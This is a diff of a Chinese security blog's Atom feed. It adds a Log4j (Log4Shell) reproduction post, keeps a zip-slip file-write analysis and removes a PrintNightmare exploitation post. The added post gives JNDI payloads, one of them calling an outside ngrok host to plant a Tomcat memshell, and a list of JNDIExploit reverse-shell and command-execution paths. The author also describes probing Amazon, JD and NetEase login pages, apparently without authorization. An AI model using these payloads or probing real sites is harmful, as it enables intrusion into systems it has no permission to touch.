@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-12-05T01:17:30.475Z</updated>
+  <updated>2021-12-14T17:09:33.121Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>log4j漏洞复现</title>
+    <link href="http://422926799.github.io/posts/98d13101.html"/>
+    <id>http://422926799.github.io/posts/98d13101.html</id>
+    <published>2021-12-14T16:38:49.000Z</published>
+    <updated>2021-12-14T17:09:33.121Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞。</p><p>经分析，log4j2是全球使用广泛的java日志框架，同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p><p><strong>影响版本:Apache Log4j 2.x &lt;= 2.14.1</strong><br><img src="https://static.aichat.net/chat/202112/4a24af97-d778-4b04-a26c-6021a07e000e.png" alt=""></p><p>漏洞利用条件：</p><pre><code>core和api同时调用才可以利用成功，对于lombok这种方式却不行</code></pre><p>jdk版本限制<br><img src="https://static.aichat.net/chat/202112/7f779424-3bf0-4c58-9413-a14ea4ef06e8.png" alt=""></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>181和之前的利用  是ldap-&gt;发送重定向到class-&gt;远程加载class执行</p><p>限制:<br>限制了远程加载class,被限制的版本只能接受ldap的结果,不接受加载远程class</p><p>高版本的绕过：<br>绕过是ldap直接发送调用本地el库执行，不再发送重定向class，不加载远程类，ldap查询还是会发</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>POC</p><pre><code>${jndi:ldap://x.4j2a.dnslog.cn/exp} #有登录框就插，判断是否有回显 （有代表可能可以利用）</code></pre><p>当天晚上测试的 （亚马逊，网易云，京东，icound等等）<br><img src="https://static.aichat.net/chat/202112/ef86937d-6b9d-4300-b62f-2f4eafa80090.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e8b79e36-ebd7-4485-b4a2-c0ca4ac72fec.png" alt=""></p><p>本地测试环境:JDK_1.8.0_181和JDK_1.8.0_191 | 对应：8u181、8u191<br>Main.java</p><pre><code class="java">package com.company;import java.io.*;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Main {    public static final Logger logger = LogManager.getLogger(Main.class);    public static void main(String[] args) {        System.out.println(&quot;Start&quot;);        logger.error(&quot;${lower:${jndi:rmi://127.0.0.1:1099/wlzyww}}&quot;);    }}</code></pre><p>8u191 ldap可以请求出去，但是无法加载利用<br><img src="https://static.aichat.net/chat/202112/b0e3516e-2431-4652-9bac-693d0f37d3a5.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/462f6476-bb7b-4791-b9e0-777b681a8767.png" alt=""></p><p>调用栈跟踪：（大哥跟的）<br><img src="https://static.aichat.net/chat/202112/ac71e84a-232b-4af6-b228-f6a2e6af3397.png" alt=""></p><p>致远|用友A8利用log4j getshell<br>JNDIExploit-1.2-SNAPSHOT.jar:<a href="https://github.com/0x727/JNDIExploit" target="_blank" rel="noopener">https://github.com/0x727/JNDIExploit</a></p><pre><code>Supported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</code></pre><p>VPS/本地+ngrok<br><img src="https://static.aichat.net/chat/202112/3535500d-616d-4383-a347-de618310fe6e.png" alt=""></p><p>登录框插</p><pre><code>${jndi:ldap://4.tcp.ngrok.io:14296/Basic/TomcatMemshell2}</code></pre><p><img src="https://static.aichat.net/chat/202112/6deb3459-2646-40ed-a98a-3af3f92410c4.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/6d7d8566-f28f-4d38-879e-989199721561.png" alt=""></p><p>现存在问题:有些不行但是ldap能请求出来(一般是版本不行,不会bypass)</p><p>上线shellcode<br>将java执行shellcode编译为class，配合marshalsec即可<br><img src="https://static.aichat.net/chat/202112/63710e6a-a42e-494d-a297-b01aa2b25345.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a><br><a href="https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ</a><br><a href="https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    
+  </entry>
+  
+  <entry>
     <title>某DCS zip Slip任意写文件漏洞</title>
     <link href="http://422926799.github.io/posts/d1787975.html"/>
     <id>http://422926799.github.io/posts/d1787975.html</id>
     <published>2021-12-05T00:53:20.000Z</published>
-    <updated>2021-12-05T01:17:30.475Z</updated>
+    <updated>2021-12-05T01:17:37.089Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hw的时候遇到的，结束后复现找了一下漏洞代码<br><img src="https://i.bmp.ovh/imgs/2021/12/1ec77b267b96fd4d.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞url:</p><pre><code>/dcs.web/upload?convertType=19&amp;isSourceDir=0</code></pre><p>文档说明<br><img src="https://s4.ax1x.com/2021/12/05/oBnmE8.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnu4g.png" alt=""></p><p>upload处理点<br><img src="https://s4.ax1x.com/2021/12/05/oBnQ3j.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn1vn.png" alt=""></p><p>config.inputDir.getPath()获取config.properties里的dir.input，然后设置了三个属性值:</p><pre><code>* fname - 文件名* finput - 文件上传后的路径* sourceRelativepath - 生成的UUID</code></pre><p><img src="https://s4.ax1x.com/2021/12/05/oBnw8J.png" alt=""></p><p>文件写入到input目录后，返回json请求/convert进行处理<br>首先调用buildParam函数进行处理<br><img src="https://s4.ax1x.com/2021/12/05/oBnyb6.png" alt=""></p><p>获取convertType参数，然后转换成int类型。传入EnumConvertType.getEnum判断值是否存在hash表里<br><img src="https://s4.ax1x.com/2021/12/05/oBncVK.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn25D.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnh2d.png" alt=""></p><p>经过获取一些请求参数后，然后来到 String lowrealInput = realInput.toLowerCase()<br><img src="https://s4.ax1x.com/2021/12/05/oBn4xA.png" alt=""></p><p>往上跟踪发现取finput属性，获取inputDir，outputDir，zipFileName，zipOutput请求参数。然后进行判断，由于请求都没有带到这些参数所以去到finput<br><img src="https://s4.ax1x.com/2021/12/05/oBnort.png" alt=""></p><p>然后进入大判断，判断lowrealInput尾部是否存在对应的后缀，并将EnumConvertType设置为对应的hash表key<br><img src="https://s4.ax1x.com/2021/12/05/oBnHVf.png" alt=""></p><p>然后去到284行，获取fname，fileName属性的值。判断fileName不为空调用setFIleName函数。设置this.fileName,然后获取compressedSuffix请求参数，最后判断enumType不为空调用updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnqIS.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnXGQ.png" alt=""></p><p>updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnj2j.png" alt=""></p><p>后面就是对一些请求参数转int进行设置<br><img src="https://s4.ax1x.com/2021/12/05/oBnvxs.png" alt=""></p><p>回到ConvertParamBuilder.class，经过checkParam函数判断是不是pdf，然后单独开个线程处理然后生成json调用getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuiIU.png" alt=""></p><p>getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuAG4.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBuVz9.png" alt=""></p><p>getResultDate函数生成返回的url<br><img src="https://s4.ax1x.com/2021/12/05/oBueMR.png" alt=""></p><p>ZipService.zipfile函数，先获取tmpDir目录然后调用copyDirectiory函数将input目录下上传的文件copy到out目录。最后调用zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuKZ6.png" alt=""></p><p>zip函数如下<br><img src="https://s4.ax1x.com/2021/12/05/oBuQIO.png" alt=""></p><p>zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBu3Je.png" alt=""></p><p>引用一张图<br><img src="https://s4.ax1x.com/2021/12/05/oBuYQA.png" alt=""></p><p>参考链接:<a href="https://saucer-man.com/information_security/364.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/364.html</a></p><p><img src="https://s4.ax1x.com/2021/12/05/oButsI.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBucyn.png" alt=""></p>]]></content>
     
@@ -441,29 +463,6 @@
     
     
     <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2021-1675复现</title>
-    <link href="http://422926799.github.io/posts/c257aa46.html"/>
-    <id>http://422926799.github.io/posts/c257aa46.html</id>
-    <published>2021-06-30T19:15:07.000Z</published>
-    <updated>2021-06-30T19:28:26.845Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Windows Print Spooler 远程代码执行漏洞&lt;br&gt;CVE-2021-1675&lt;b</summary>
-      
-    
-    
-    
-    
-    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
     
   </entry>
   
